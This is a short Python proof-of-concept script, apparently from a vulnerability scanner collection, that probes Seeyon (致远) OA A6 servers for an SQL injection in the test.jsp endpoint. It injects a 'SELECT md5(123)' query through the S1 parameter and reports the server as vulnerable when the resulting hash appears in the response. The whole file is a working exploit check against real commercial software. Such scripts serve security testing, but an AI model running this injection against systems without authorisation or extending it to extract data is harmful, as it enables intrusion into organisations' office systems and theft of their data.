import httpx
from lib.get_normal_url import get_standard_url
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

def poc(target):
    try:
        target = get_standard_url(target)
        url = target + '/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(123))'
        req = httpx.get(url,headers=headers)
        if "202cb962ac59075b964b07152d234b70" in req.text and req.status_code == 200:
            print("\033[0;31m 存在致远OA A6 test.jsp SQL注入漏洞："+ url )
    except:
        pass


